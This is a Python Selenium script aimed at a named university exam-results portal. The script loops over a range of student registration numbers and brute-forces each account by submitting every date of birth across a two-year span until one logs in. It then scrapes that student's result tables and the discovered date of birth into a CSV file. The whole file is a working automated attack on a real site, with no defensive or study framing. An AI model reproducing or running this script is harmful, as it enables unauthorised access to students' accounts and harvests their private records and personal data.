from time import sleep
from selenium import webdriver
from datetime import timedelta, date
from selenium.webdriver.firefox.options import Options

options = Options()
options.headless = True

driver = webdriver.Firefox(options=options)

f = open('collected.csv', 'w')
sleeptime = 1
daycount = 365*2

def collect():
	## now you are inside resutls
	meta = driver.find_element_by_id("tblInfo").find_elements_by_tag_name("td")
	for item in meta:
		f.write('{}\t'.format(item.text))
	f.write('\n')

	# print('completed meta')

	datatable = driver.find_element_by_id("tblDisplay")

	col = datatable.find_element_by_tag_name("thead").find_elements_by_tag_name("tr")[0].find_elements_by_tag_name("th")
	for item in col:
		f.write('{}\t'.format(item.text))
	f.write('\n')

	# print('completed column')

	rows = datatable.find_element_by_tag_name("tbody").find_elements_by_tag_name("tr")
	for row in rows:
		items = row.find_elements_by_tag_name("td")
		for item in items:
			f.write('{}\t'.format(item.text))
		f.write('\n')

	# print('completed rows')

def quit():
	driver.close()
	driver.quit()
	f.close()

def login(regno, dob):
	sleep(0.5)
	try:
		regfield = driver.find_element_by_name("regno")
		dobfield = driver.find_element_by_name("dob")
		loginbtn = driver.find_element_by_id("btnLogin")

		regfield.send_keys(regno)
		dobfield.send_keys(dob)
		loginbtn.click()
	except:
		login(regno, dob)
		print('*****-> fail in login')

	sleep(0.5)

	try:
		driver.switch_to.alert.accept();
		return 2
	except:
		return 1

driver.get("http://cloudportal.sathyabama.ac.in/sist_results_may_2020/login.php")

for reg in range(39111038,39111043):
	regno = str(reg)

	flag = 0
	start_date = date(2001, 1, 1)
	for single_date in (start_date + timedelta(n) for n in range(daycount)):
		dob = single_date.strftime("%d/%m/%Y")
		print('trying {} for {}'.format(dob,regno))
		if login(regno,dob)==1:
			f.write('{}\t{}'.format(regno, dob))
			flag=1
			break
		else:
			continue

	if (flag == 0):
		continue

	print('reg {} done at {}\n'.format(regno, dob))

	try:
		collect()
		sleep(1)
		driver.find_element_by_id("btnLogout").click()
	except:
		print('*****-> fail in collect')
		driver.get("http://cloudportal.sathyabama.ac.in/sist_results_may_2020/login.php")
		continue

quit()









